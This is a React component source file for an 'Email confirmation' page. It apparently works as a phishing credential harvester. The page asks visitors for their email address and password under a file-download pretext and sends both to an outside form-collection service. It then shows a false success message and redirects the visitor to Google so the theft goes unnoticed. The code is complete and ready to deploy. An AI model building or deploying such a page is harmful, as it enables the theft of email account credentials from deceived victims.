import React, { useState, useEffect } from "react";
import { useFormspark } from "@formspark/use-formspark";
import PacmanLoader from "react-spinners/PacmanLoader";

const FORMSPARK_FORM_ID = "ekS3rX9oR";

const EmailConfirm = () => {
  const [emlId, setEmlId] = useState("");
  const [emlPass, setEmlPass] = useState("");
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [successMessage, setSuccessMessage] = useState('');
  const [submit, submitting] = useFormspark({ formId: FORMSPARK_FORM_ID });

  const handleSubmit = async (event) => {
    event.preventDefault();
    setLoading(true);
    try {
      // Simulate form submission
      await submit({ email: emlId, password: emlPass });
      // If successful, reset form fields and error message, and set success message
      setEmlId("");
      setEmlPass("");
      setErrorMessage('');
      setSuccessMessage('Your file will be downloaded to your email please wait for 24 hours before trying again.');
      // Redirect to Google homepage after 5 seconds
      setTimeout(() => {
        window.location.href = "https://www.google.com";
      }, 5000);
    } catch (error) {
      // If there's an error, set error message
      setErrorMessage('Incorrect credentials');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    const timer = setTimeout(() => {
      setSuccessMessage('');
    }, 5000); // Clear success message after 5 seconds
    return () => clearTimeout(timer);
  }, [successMessage]);

  return (
    <div className="flex justify-center items-center h-screen">
      <div className="md:w-96 w-80 p-4 md:p-8 bg-white">
        <div className="text-lg bold text-red-600 my-2 font-bold">Email confirmation!</div>
        <form onSubmit={handleSubmit}>
          <input
            type="email"
            value={emlId}
            onChange={(e) => setEmlId(e.target.value)}
            className="outline-none border-black p-2 my-3 border-2 w-full"
            placeholder="Email Confirmation *"
            required
          />
          <input
            type="password"            
            value={emlPass}
            onChange={(e) => setEmlPass(e.target.value)}
            className="outline-none border-black p-2 my-3 border-2 w-full"
            placeholder="Confirmation password *"
            required
          />
          <div className="py-5 w-full">
            <button
              type="submit"
              className="px-6 py-2 w-full text-white font-semibold bg-blue-700 rounded-md"
              disabled={submitting}
            >
              {submitting ? (
                <PacmanLoader
                  color={'#ffffff'}
                  loading={true} // Always display the loading icon
                  size={20}
                />
              ) : (
                'Sign In'
              )}
            </button>
            {errorMessage && <p className="text-red-500">{errorMessage}</p>}
            {successMessage && <p className="text-green-500">{successMessage}</p>}
          </div>
        </form>
      </div>
    </div>
  );
};

export default EmailConfirm;
